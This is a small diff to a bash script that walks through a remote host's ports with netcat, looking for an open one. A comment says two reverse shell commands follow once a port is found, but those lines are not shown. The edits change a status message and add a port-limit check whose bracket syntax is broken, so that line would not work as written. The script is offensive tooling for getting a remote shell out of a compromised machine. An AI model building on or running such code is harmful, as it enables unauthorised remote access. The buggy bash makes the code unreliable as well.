@@ -19,7 +19,7 @@ do
     # Try to connect to the remote host using nc
     if nc -zv $remote_host $remote_port &> /dev/null; then
     
-        echo "Connection succeeded on port $remote_port. Opening shell."
+        echo "Open Port Found!! Port = $remote_port"
     
         ## THE FOLLOWING TWO LINES ARE TWO DIFFERENT REVERSE SHELL COMMANDS
         # bash syntax
@@ -36,8 +36,12 @@ do
         # echo "Connection refused on port $remote_port, trying next port."
         
     fi
-    
+
     ((remote_port++))
+
+    if [$remote_port -gt 65535]; then
+        break
+    fi
 done
 
 
